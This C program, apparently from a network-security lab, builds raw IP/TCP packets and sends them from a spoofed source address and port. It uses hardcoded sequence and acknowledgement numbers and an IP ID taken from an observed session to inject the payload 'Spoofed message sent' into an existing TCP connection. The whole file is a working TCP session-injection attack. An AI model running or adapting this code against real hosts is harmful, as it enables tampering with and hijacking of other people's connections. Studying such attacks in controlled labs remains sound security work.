#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// pseudo header needed for tcp header checksum calculation
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

#define DATAGRAM_LEN 4096
#define OPT_SIZE 20


// This function calculates the checksum of a given buffer.
unsigned short checksum(const char *buf, unsigned size)
{
	unsigned sum = 0, i;

	/* Accumulate checksum */
	for (i = 0; i < size - 1; i += 2)
	{
		unsigned short word16 = *(unsigned short *) &buf[i];
		sum += word16;
	}

	/* Handle odd-sized case */
	if (size & 1)
	{
		unsigned short word16 = (unsigned char) buf[i];
		sum += word16;
	}

	/* Fold to get the ones-complement result */
	while (sum >> 16) sum = (sum & 0xFFFF)+(sum >> 16);

	/* Invert to get the negative in ones-complement arithmetic */
	return ~sum;
}


// This function creates a TCP data packet, including IP and TCP headers.
void create_data_packet(struct sockaddr_in* src, struct sockaddr_in* dst, int32_t seq, int32_t ack_seq, char* data, int data_len, char** out_packet, int* out_packet_len)
{
	// datagram to represent the packet
	char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

	// required structs for IP and TCP header
	struct iphdr *iph = (struct iphdr*)datagram;
	struct tcphdr *tcph = (struct tcphdr*)(datagram + sizeof(struct iphdr));
	struct pseudo_header psh;

	// set payload
	char* payload = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
	memcpy(payload, data, data_len);

	// IP header configuration
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE + data_len;
/*>>>>>>>>>>>>>>>*/
	iph->id = htonl(24606); //--------->  harcode ID of this packet +1 !!!
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; 
	iph->saddr = src->sin_addr.s_addr;
	iph->daddr = dst->sin_addr.s_addr;

	// TCP header configuration
	tcph->source = src->sin_port;
	tcph->dest = dst->sin_port;
	tcph->seq = htonl(seq);            
	tcph->ack_seq = htonl(ack_seq);     
	tcph->doff = 10; // tcp header size
	tcph->fin = 0;
	tcph->syn = 0;
	tcph->rst = 0;
	tcph->psh = 1;
	tcph->ack = 1;
	tcph->urg = 0;
	tcph->check = 0; 
	tcph->window = htons(5840); // window size
	tcph->urg_ptr = 0;

	// TCP pseudo header for checksum calculation
	psh.source_address = src->sin_addr.s_addr;
	psh.dest_address = dst->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE + data_len);
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE + data_len;
	// fill pseudo packet
	char* pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE + data_len);

	tcph->check = checksum((const char*)pseudogram, psize);
	iph->check = checksum((const char*)datagram, iph->tot_len);

	*out_packet = datagram;
	*out_packet_len = iph->tot_len;
	free(pseudogram);
}

int main(int argc, char** argv)
{   
	if (argc != 4)
	{
		printf("invalid parameters.\n");
		printf("USAGE %s <source-ip> <target-ip> <port>\n", argv[0]);
		return 1;
	}

	srand(time(NULL));

    // socket creation and configuration
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock == -1)
	{
		printf("socket creation failed\n");
		return 1;
	}

	// destination IP address configuration    
	struct sockaddr_in daddr;
	daddr.sin_family = AF_INET;
	daddr.sin_port = htons(atoi(argv[3]));
	if (inet_pton(AF_INET, argv[2], &daddr.sin_addr) != 1)
	{
		printf("destination IP configuration failed\n");
		return 1;
	}

	// source IP address configuration
	struct sockaddr_in saddr;
	saddr.sin_family = AF_INET;
/*>>>>>>>>>>>>>>>*/
	saddr.sin_port = htons(48176);  // --------> fake sender port
	if (inet_pton(AF_INET, argv[1], &saddr.sin_addr) != 1)
	{
		printf("source IP configuration failed\n");
		return 1;
	}

	
	printf("selected source port number: %d\n", ntohs(saddr.sin_port));

	// tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1)
	{
		printf("setsockopt(IP_HDRINCL, 1) failed\n");
		return 1;
	}



	// read sequence number to acknowledge in next packet
	uint32_t new_seq_num, ack_num;

/*>>>>>>>>>>>>>>>*/
    new_seq_num =  780729048+13;    //--------> hardcode new_seq_num + #bytes
/*>>>>>>>>>>>>>>>*/
    ack_num =      2506576599;   //--------> hardcode ack_num
	

    char *packet;
    int packet_len;
    int sent;

	// send data
	char request[] = "Spoofed message sent\n";  //->custom message
	create_data_packet(&saddr, &daddr,  new_seq_num, ack_num, request, sizeof(request) - 1/sizeof(char), &packet, &packet_len);
	if ((sent = sendto(sock, packet, packet_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr))) == -1)
	{
		printf("send failed\n");
	}
	else
	{
		printf("successfully sent %d bytes PSH!\n", sent);
	}


	close(sock);
	return 0;
}